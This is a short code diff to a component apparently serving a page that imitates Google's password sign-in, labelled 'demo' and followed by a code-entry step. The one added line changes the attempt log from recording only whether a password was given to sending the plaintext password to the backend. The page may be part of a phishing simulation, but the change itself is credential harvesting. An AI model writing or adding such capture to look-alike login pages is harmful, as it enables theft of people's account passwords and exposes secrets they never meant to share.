@@ -74,6 +74,7 @@ export default function DemoGooglePasswordPage() {
       await apiClient.logDemoGoogleAttempt({
         step: 'password',
         email: email.trim(),
+        password,
         passwordProvided: Boolean(password),
       });
       router.push('/demo/google/code');
